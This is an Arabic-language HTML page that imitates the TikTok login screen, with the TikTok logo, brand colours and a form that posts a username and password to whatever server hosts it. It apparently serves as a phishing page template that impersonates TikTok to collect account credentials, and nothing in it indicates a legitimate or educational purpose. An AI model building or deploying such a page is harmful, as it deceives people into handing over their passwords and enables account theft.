<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8" />
<title>تسجيل الدخول إلى تيك توك</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');

  body {
    margin: 0;
    background-color: #ffffff;
    font-family: 'Roboto', sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
  }

  .container {
    background-color: #ffffff;
    padding: 40px 35px;
    border: 1px solid #e6e6e6;
    border-radius: 8px;
    width: 350px;
    text-align: center;
    box-sizing: border-box;
    box-shadow: 0 1px 5px rgba(0,0,0,0.1);
  }

  .logo {
    margin-bottom: 30px;
  }

  .logo img {
    width: 120px;
    height: auto;
    display: block;
    margin: 0 auto;
  }

  h2 {
    margin-bottom: 25px;
    font-weight: 600;
    font-size: 22px;
    color: #000000;
  }

  input[type="text"], input[type="password"] {
    width: 100%;
    padding: 12px 14px;
    margin-bottom: 20px;
    border: 1px solid #ddd;
    border-radius: 6px;
    font-size: 15px;
    box-sizing: border-box;
    direction: ltr;
  }

  button {
    width: 100%;
    background-color: #fe2c55; /* لون شعار تيك توك */
    color: white;
    border: none;
    padding: 14px 0;
    border-radius: 6px;
    font-size: 16px;
    font-weight: 700;
    cursor: pointer;
  }

  button:hover {
    background-color: #e22348;
  }

  ::placeholder {
    color: #999999;
    text-align: right;
  }
</style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok Logo" />
    </div>
    <h2>تسجيل الدخول إلى تيك توك</h2>
    <form method="POST">
      <input type="text" name="username" placeholder="اسم المستخدم أو البريد الإلكتروني" required />
      <input type="password" name="password" placeholder="كلمة المرور" required />
      <button type="submit">تسجيل الدخول</button>
    </form>
  </div>
</body>
</html>
